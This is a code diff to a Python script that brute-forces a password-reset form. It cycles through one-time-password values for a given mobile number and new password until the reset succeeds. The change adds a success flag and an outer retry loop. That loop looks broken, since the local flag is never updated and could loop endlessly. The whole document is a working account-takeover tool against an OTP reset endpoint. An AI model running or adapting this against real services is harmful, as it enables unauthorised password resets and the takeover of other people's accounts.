@@ -19,6 +19,7 @@ def forgot_password(mobile, otp, password, cnf_password):
     if response.status_code == 200:
         if re.search(r"success", response.text):
             print("Password reset successful")
+            config.FLAG = True
             return 1
         elif re.search(r"OTP Expired, Please Create new OTP!", response.text):
             print("Error: " , otp , "otp expired create new one.")
@@ -36,16 +37,17 @@ if __name__ == "__main__":
     password = config.PASSWORD
     cnf_password = config.CNF_PASSWORD
     otp = config.R1
-
-    while otp <= config.R2:
-        try:
-            result = forgot_password(mobile, otp, password, cnf_password)
-            if result == 1:
-                break
-            elif result == 2:
-                otp += 1
-            else:
-                continue
-        except Exception as e:
-            print(f"Error for OTP {otp}: {e}")
-    session.close()
+    flag = config.FLAG
+    while flag != True:
+        while otp <= config.R2:
+            try:
+                result = forgot_password(mobile, otp, password, cnf_password)
+                if result == 1:
+                    break
+                elif result == 2:
+                    otp += 1
+                else:
+                    continue
+            except Exception as e:
+                print(f"Error for OTP {otp}: {e}")
+        session.close()
